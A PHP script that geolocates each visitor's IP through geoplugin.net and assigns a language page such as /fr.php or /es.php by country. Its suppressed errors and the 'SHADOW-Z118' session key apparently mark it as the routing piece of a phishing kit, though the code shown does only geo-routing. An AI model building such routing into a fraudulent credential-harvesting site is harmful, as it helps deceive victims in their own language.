﻿<?php
session_start();
error_reporting(0); 			  

$url = "http://www.geoplugin.net/json.gp?ip=".getenv("REMOTE_ADDR");
$st = curl_init();
curl_setopt($st,CURLOPT_URL,$url);
curl_setopt($st,CURLOPT_RETURNTRANSFER,1);
curl_setopt($st,CURLOPT_FOLLOWLOCATION, 1);
$get = curl_exec($st);  // $.....
curl_close($st);
$ip_data = @json_decode($get);
if($ip_data && $ip_data->geoplugin_countryCode != null){
   $_SESSION['_countrycode_'] = $ip_data->geoplugin_countryCode;
}


if ($_SESSION['_countrycode_'] == "FR" || $_SESSION['_countrycode_'] == "DZ" || $_SESSION['_countrycode_'] == "MA" || $_SESSION['_countrycode_'] == "TN" || $_SESSION['_countrycode_'] == "CD" || $_SESSION['_countrycode_'] == "MG" || $_SESSION['_countrycode_'] == "CM" || $_SESSION['_countrycode_'] == "CA" || $_SESSION['_countrycode_'] == "CI" || $_SESSION['_countrycode_'] == "BF" || $_SESSION['_countrycode_'] == "NE" || $_SESSION['_countrycode_'] == "SN" || $_SESSION['_countrycode_'] == "ML" || $_SESSION['_countrycode_'] == "RW" || $_SESSION['_countrycode_'] == "BE" || $_SESSION['_countrycode_'] == "GF" || $_SESSION['_countrycode_'] == "TD" || $_SESSION['_countrycode_'] == "HT" || $_SESSION['_countrycode_'] == "BI" || $_SESSION['_countrycode_'] == "BJ" || $_SESSION['_countrycode_'] == "CH" || $_SESSION['_countrycode_'] == "TG" || $_SESSION['_countrycode_'] == "CF" || $_SESSION['_countrycode_'] == "CG" || $_SESSION['_countrycode_'] == "GA" || $_SESSION['_countrycode_'] == "KM" || $_SESSION['_countrycode_'] == "GK" || $_SESSION['_countrycode_'] == "DJ" || $_SESSION['_countrycode_'] == "LU" || $_SESSION['_countrycode_'] == "VU" || $_SESSION['_countrycode_'] == "SC" || $_SESSION['_countrycode_'] == "MC" || $_SESSION['_countrycode_'] == "GQ" || $_SESSION['_countrycode_'] == "GN") {
    $_SESSION['SHADOW-Z118'] = "/fr.php";
}elseif ($_SESSION['_countrycode_'] == "MX" || $_SESSION['_countrycode_'] == "PH" || $_SESSION['_countrycode_'] == "ES" || $_SESSION['_countrycode_'] == "CO" || $_SESSION['_countrycode_'] == "AR" || $_SESSION['_countrycode_'] == "PE" || $_SESSION['_countrycode_'] == "VE" || $_SESSION['_countrycode_'] == "CL" || $_SESSION['_countrycode_'] == "EC" || $_SESSION['_countrycode_'] == "GT" || $_SESSION['_countrycode_'] == "CU" || $_SESSION['_countrycode_'] == "HN" || $_SESSION['_countrycode_'] == "PY" || $_SESSION['_countrycode_'] == "SV" || $_SESSION['_countrycode_'] == "NI" || $_SESSION['_countrycode_'] == "CR" || $_SESSION['_countrycode_'] == "UY"   || $_SESSION['_countrycode_'] == "BO"  || $_SESSION['_countrycode_'] == "SR"  || $_SESSION['_countrycode_'] == "DO" || $_SESSION['_countrycode_'] == "GQ"  || $_SESSION['_countrycode_'] == "PA"  || $_SESSION['_countrycode_'] == "PR" ){
    $_SESSION['SHADOW-Z118'] = "/es.php";
}elseif ($_SESSION['_countrycode_'] == "IT" || $_SESSION['_countrycode_'] == "SM"){
   $_SESSION['SHADOW-Z118'] = "/it.php";
}elseif ($_SESSION['_countrycode_'] == "DE" || $_SESSION['_countrycode_'] == "CH"){
    $_SESSION['SHADOW-Z118'] = "/de.php";
}else {
   $_SESSION['SHADOW-Z118'] = "/en.php";
}

?>